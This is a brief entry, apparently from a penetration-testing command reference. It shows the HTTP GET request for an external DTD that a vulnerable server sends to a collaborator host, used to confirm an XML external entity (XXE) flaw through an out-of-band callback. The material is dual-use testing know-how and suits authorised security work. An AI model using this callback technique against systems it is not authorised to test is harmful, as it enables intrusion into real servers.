---
data: GET /x.dtd HTTP/1.1
tags:
  - http
  - oob
type: command
executor: bash
platforms:
  - Web
id: 08de5bc8-40c6-4304-b56e-fa7b486e548d
created_at: '2025-12-13T09:00:33.666Z'
updated_at: '2025-12-13T09:00:33.666Z'
verified: false
validated: true
submitted: true
---
# GET External DTD

## Command

```bash
GET /x.dtd HTTP/1.1
Host: collaborator-domain.net
User-Agent: Java/1.8.0_XXX
```

## Description

Server-initiated request to fetch external DTD, confirming XXE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Collaborator domain | Yes |
| `User-Agent` | Server identifier | No |

## Examples

### Basic Usage

```bash
GET /x.dtd HTTP/1.1
Host: collaborator-domain.net
```

## Expected Output

Confirms vulnerability via callback.

## Related

- [[procedures/Confirm-XXE-Vulnerability]]
